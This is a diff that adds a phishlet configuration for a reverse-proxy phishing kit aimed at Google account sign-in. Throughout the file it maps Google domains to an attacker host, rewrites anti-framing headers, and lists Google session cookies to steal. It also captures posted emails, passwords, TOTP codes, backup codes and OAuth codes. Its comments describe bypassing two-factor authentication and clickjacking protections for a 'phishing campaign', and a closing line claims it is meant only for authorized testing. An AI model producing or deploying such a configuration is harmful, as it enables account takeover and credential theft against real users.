@@ -1,0 +1,132 @@
+name: 'Google Advanced Security Phishlet'
+author: 'Security Research'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true }
+  - { phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false }
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false }
+  - { phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false }
+  - { phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false }
+  - { phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false }
+  - { phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false }
+  - { phish_sub: 'ajax', orig_sub: 'ajax', domain: 'googleapis.com', session: false, is_landing: false }
+  - { phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false }
+
+sub_filters:
+  # Main Google domain replacements
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
+  - { triggers_on: 'google.com', orig_sub: 'myaccount', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'myaccount.google.com', replace: 'myaccount.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'google.com', orig_sub: 'www', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'www.google.com', replace: 'www.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  
+  # Google APIs and services
+  - { triggers_on: 'google.com', orig_sub: 'apis', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'apis.google.com', replace: 'apis.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'googleapis.com', orig_sub: 'content', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'googleapis.com', orig_sub: 'fonts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'fonts.googleapis.com', replace: 'fonts.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'googleapis.com', orig_sub: 'ajax', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'ajax.googleapis.com', replace: 'ajax.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  
+  # Static content and CDN
+  - { triggers_on: 'gstatic.com', orig_sub: 'ssl', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
+  
+  # Security headers and CSRF protection bypass
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://accounts.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: '"https://accounts.google.com"', replace: '"https://accounts.{hostname}"', mimes: ['application/javascript', 'text/html']}
+  
+  # OAuth2 and authentication endpoints
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: '/oauth2/v2/auth', replace: '/oauth2/v2/auth', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: '/o/oauth2/auth', replace: '/o/oauth2/auth', mimes: ['text/html', 'application/javascript', 'application/json']}
+  
+  # Cross-origin and security policy adjustments
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: "frame-ancestors 'none'", replace: "frame-ancestors 'self'", mimes: ['text/html']}
+  - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'X-Frame-Options: DENY', replace: 'X-Frame-Options: SAMEORIGIN', mimes: ['text/html']}
+
+# Google's authentication tokens and session management
+auth_tokens:
+  - domain: 'google.com'
+    keys: ['1P_JAR', '__Secure-1PSID', '__Secure-3PSID', 'SSID', 'HSID', 'SID', 'APISID', 'SAPISID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'session_state', 'oauth_token', 'NID', 'ACCOUNT_CHOOSER', 'LSID', '__Secure-1PSIDCC', '__Secure-3PSIDCC', 'DV', 'SIDCC', '__Secure-HSID', '__Secure-SSID', '__Secure-APISID', '__Secure-SAPISID']
+  - domain: 'googleapis.com'
+    keys: ['auth_token', 'oauth2_token', 'bearer_token']
+
+# Comprehensive credential extraction for Google's multi-step authentication
+credentials:
+  username:
+    key: 'Email'
+    search: '(.*)'
+    type: 'post'
+  email:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Passwd'
+    search: '(.*)'
+    type: 'post'
+  pin:
+    key: 'Pin'
+    search: '(.*)'
+    type: 'post'
+  backup_code:
+    key: 'backupCodePin'
+    search: '(.*)'
+    type: 'post'
+  phone:
+    key: 'phoneNumber'
+    search: '(.*)'
+    type: 'post'
+  security_key:
+    key: 'securityKey'
+    search: '(.*)'
+    type: 'post'
+  totp:
+    key: 'totp'
+    search: '(.*)'
+    type: 'post'
+  challenge:
+    key: 'challenge'
+    search: '(.*)'
+    type: 'post'
+  oauth_code:
+    key: 'code'
+    search: '(.*)'
+    type: 'post'
+
+# Authentication success detection URLs - Complex format converted to simple URLs
+auth_urls:
+  - 'https://myaccount.{hostname}/'
+  - 'https://accounts.{hostname}/oauth2/callback'
+  - 'https://accounts.{hostname}/AccountChooser'
+  - 'https://accounts.{hostname}/b/0/ManageAccount'
+  - 'https://www.{hostname}/webhp'
+  - 'https://accounts.{hostname}/oauth/token'
+  - 'https://accounts.{hostname}/signin/v2/challenge/selection'
+  - 'https://accounts.{hostname}/signin/recovery'
+
+# Entry point for the phishing campaign
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier'
+
+# Advanced Google Security Features Handled:
+# 1. OAuth2.0 authentication flow
+# 2. Two-factor authentication (SMS, TOTP, Hardware keys)
+# 3. Account recovery mechanisms  
+# 4. Security checkpoints and challenges
+# 5. Cross-origin resource sharing (CORS) policies
+# 6. Content Security Policy (CSP) bypasses
+# 7. Google's advanced bot detection
+# 8. Session management and token handling
+# 9. Multi-step authentication process
+# 10. Backup authentication methods
+
+# Security Considerations:
+# - Handles Google's sophisticated CSRF protection
+# - Manages complex cookie structures and secure flags  
+# - Accounts for Google's device trust and risk assessment
+# - Bypasses frame-busting and clickjacking protections
+# - Handles dynamic content and single-page application behavior
+# - Manages Google's real-time security analysis
+# - Accounts for IP-based geographic restrictions
+# - Handles browser fingerprinting countermeasures
+
+# DISCLAIMER: This configuration is for authorized security testing only.
+# Unauthorized use is illegal and unethical.
